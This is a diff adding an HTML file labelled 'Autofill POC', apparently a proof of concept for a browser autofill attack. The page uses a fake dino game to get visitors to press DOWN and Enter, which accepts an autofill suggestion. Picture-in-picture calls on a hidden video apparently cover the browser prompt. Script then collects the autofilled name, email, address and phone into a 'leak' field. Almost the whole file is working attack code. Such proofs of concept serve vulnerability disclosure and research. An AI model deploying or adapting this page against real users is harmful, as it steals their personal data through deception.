@@ -1,0 +1,191 @@
+<!DOCTYPE html>
+<html id="htmlid">
+<head>
+  <meta charset="utf-8">
+  <title>Autofill POC</title>
+  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap.min.css">
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/js/bootstrap.min.js"></script>
+
+  <style>
+    html, body {
+      font-family: sans-serif;
+      background-color: black;
+      overflow-x: hidden;
+    }
+
+    body {
+      position: absolute;
+      top: 0;
+      bottom: 0;
+      right: 0;
+      left: 0;
+    }
+
+    * {
+      padding: 0;
+      margin: 0;
+    }
+
+    input {
+      opacity: 1 !important;
+    }
+
+    .game {
+      width: 500px;
+      height: 200px;
+      border: 1px solid black;
+      margin: auto;
+      background: white;
+    }
+
+    #character {
+      width: 20px;
+      height: 50px;
+      background-color: red;
+      position: relative;
+      top: 150px;
+    }
+
+    .animate {
+      animation: jump 0.3s linear;
+    }
+
+    @keyframes jump {
+      0% { top: 150px; }
+      30% { top: 100px; }
+      70% { top: 100px; }
+      100% { top: 150px; }
+    }
+
+    #block {
+      background-color: blue;
+      width: 20px;
+      height: 20px;
+      position: relative;
+      top: 130px;
+      left: 500px;
+      animation: block 1s infinite linear;
+    }
+
+    @keyframes block {
+      0% { left: 500px }
+      100% { left: -20px }
+    }
+
+    #name {
+      position: fixed;
+      bottom: 20px;
+      right: 20px;
+      width: 300px;
+      height: 40px;
+      z-index: 9999;
+      background-color: lightyellow;
+      color: black;
+    }
+
+    #txtName {
+      background: lightgreen;
+      color: black;
+      text-shadow: 0px 0px 2px rgba(255,255,255,0.7);
+      border-style: none;
+      width: 700px;
+      height: 50px;
+    }
+
+    /* Scrollbar */
+    ::-webkit-scrollbar { width: 8px; }
+    ::-webkit-scrollbar-track { background: #f1f1f1; }
+    ::-webkit-scrollbar-thumb { background: #888; }
+    ::-webkit-scrollbar-thumb:hover { background: #555; }
+  </style>
+</head>
+<body>
+
+  <div id="instructions" style="position:fixed; top:50px; left:50px; z-index: 1;">
+    <h3><i>Play Advanced Dino Game</i></h3>
+    <h3 style="color: green; text-shadow: 0px 0px 2px rgba(255,255,255,0.7); border-style: dotted; border-width: 2px; max-width: 500px">
+      <u>DOWN</u> ARROW then (Enter) to Show Game
+    </h3>
+    <div class="game">
+      <div id="character"></div>
+      <div id="block"></div>
+    </div>
+  </div>
+
+  <div id="leak" style="position:fixed; top:10px; left:50px;">
+    <input type="text" id="txtName" readonly />
+  </div>
+
+  <video id="video" controls muted loop autoplay src="inst-overlay.mp4" autopictureinpicture hidden></video>
+
+  <!-- Autofill fields -->
+  <input name="address-line1" id="address-line1" autocomplete="address-line1" onchange="sendtoparent();" placeholder="Address Line 1">
+  <input name="address-line2" id="address-line2" autocomplete="address-line2" onchange="sendtoparent();" placeholder="Address Line 2">
+  <input name="spoof" id="spoof" autocomplete="country-name" placeholder="Country">
+  <input name="spoof" autocomplete="address-level2" placeholder="City">
+  <input name="state" autocomplete="address-level1" placeholder="State">
+  <input name="name" id="name" autofocus autocomplete="name" onfocus="video.requestPictureInPicture();" onblur="sendtoparent();" dir="ltr" placeholder="Name">
+  <input name="email" id="email" autocomplete="email" onchange="sendtoparent();" placeholder="Email">
+  <input name="postal-code" autocomplete="postal-code" placeholder="Postal Code">
+  <input name="tel" autocomplete="tel" id="tel" placeholder="Phone">
+
+  <!-- JavaScript Logic -->
+  <script>
+    const htmlid = document.getElementById('htmlid');
+    const video = document.getElementById('video');
+
+    htmlid.addEventListener('keyup', () => {
+      setTimeout(() => {
+        video.requestPictureInPicture();
+      }, 60);
+
+      setTimeout(() => {
+        video.requestPictureInPicture();
+      }, 40);
+    });
+
+    htmlid.addEventListener('click', () => {
+      setTimeout(() => {
+        // video.requestPictureInPicture();
+      }, 150);
+    });
+
+    function sendtoparent() {
+      const txtName = document.getElementById("txtName");
+      txtName.value = "Name: " + document.getElementById("name").value +
+        " ,Email: " + document.getElementById("email").value +
+        " ,Country: " + document.getElementById("spoof").value +
+        " ,Address: " + document.getElementById("address-line1").value +
+        ",Phone: " + document.getElementById("tel").value;
+    }
+
+    // Dino game logic
+    const character = document.getElementById("character");
+    const block = document.getElementById("block");
+    let counter = 0;
+
+    function jump() {
+      if (character.classList.contains("animate")) return;
+      character.classList.add("animate");
+      setTimeout(() => character.classList.remove("animate"), 300);
+    }
+
+    const checkDead = setInterval(() => {
+      const characterTop = parseInt(window.getComputedStyle(character).getPropertyValue("top"));
+      const blockLeft = parseInt(window.getComputedStyle(block).getPropertyValue("left"));
+      if (blockLeft < 20 && blockLeft > -20 && characterTop >= 130) {
+        block.style.animation = "none";
+        console.log("Game Over. score: " + Math.floor(counter / 100));
+        counter = 0;
+        block.style.animation = "block 1s infinite linear";
+      } else {
+        counter++;
+      }
+    }, 10);
+
+    setTimeout(() => video.setAttribute('src', './inst-overlay.mp4'), 100);
+  </script>
+
+</body>
+</html>
